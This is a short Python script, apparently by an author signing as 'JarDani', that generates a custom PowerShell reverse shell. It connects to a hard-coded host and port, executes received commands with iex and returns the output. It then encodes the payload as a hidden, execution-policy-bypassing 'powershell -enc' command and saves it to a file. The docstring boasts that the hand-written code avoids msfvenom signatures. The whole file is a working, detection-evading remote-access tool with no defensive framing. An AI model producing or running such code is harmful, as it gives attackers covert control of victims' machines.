"""
Custom PowerShell reverse shell generator.
Not from msfvenom - no known signatures.
Pure .NET TCP socket connection.
Author: JarDani
"""

LHOST = "192.168.217.146"
LPORT = 443

# Custom PS reverse shell using .NET sockets directly
# No msfvenom patterns - hand written
ps_shell = f"""$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
$w=New-Object System.IO.StreamWriter($s);
$w.AutoFlush=$true;
$w.WriteLine('SilentGate Shell - JarDani');
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r=(iex $d 2>&1|Out-String);
    $w.WriteLine($r);
}}"""

# Encode as UTF-16LE base64 for powershell -enc
import base64
encoded = base64.b64encode(ps_shell.encode('utf-16-le')).decode()
cmd = f"powershell.exe -nop -w hidden -ep bypass -enc {encoded}"

print(f"Command length: {len(cmd)}")
print(f"PS shell: {len(ps_shell)} bytes")

with open("tests/custom_ps_shell.txt", "w") as f:
    f.write(cmd)
print("Saved to tests/custom_ps_shell.txt")
